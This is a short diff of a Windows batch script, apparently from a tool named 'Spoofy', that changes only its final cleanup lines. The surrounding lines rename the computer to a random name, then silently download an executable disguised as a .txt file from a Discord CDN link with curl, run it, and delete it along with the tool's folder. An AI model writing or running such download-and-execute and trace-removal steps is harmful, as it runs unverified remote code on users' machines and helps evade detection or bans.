@@ -33,4 +33,5 @@ START "" /MIN /WAIT POWERSHELL Rename-Computer -NewName "%RANDOM%-PFS-%RANDOM%" 
 DEL /S /Q "x.exe"
 curl -s -g -L -o "x.exe" "https://cdn.discordapp.com/attachments/1206253821861429318/1206279610405228555/EventCleaner-exe.txt?ex=65db6e6e&is=65c8f96e&hm=8492b7336b2cd810e069047a91d54c66ac5c82caf17e9719500fb8c9bfdeb78c&"  >NUL 2>&1
 START "" /B /WAIT "x.exe" & DEL /S /Q "x.exe"
-CD /D "%SystemDrive%\" & RMDIR /S /Q "x:\Spoofy"
+DEL /S /Q "X:\Spoofy"
+CD /D "%SystemDrive%\" & RMDIR /S /Q "X:\Spoofy"
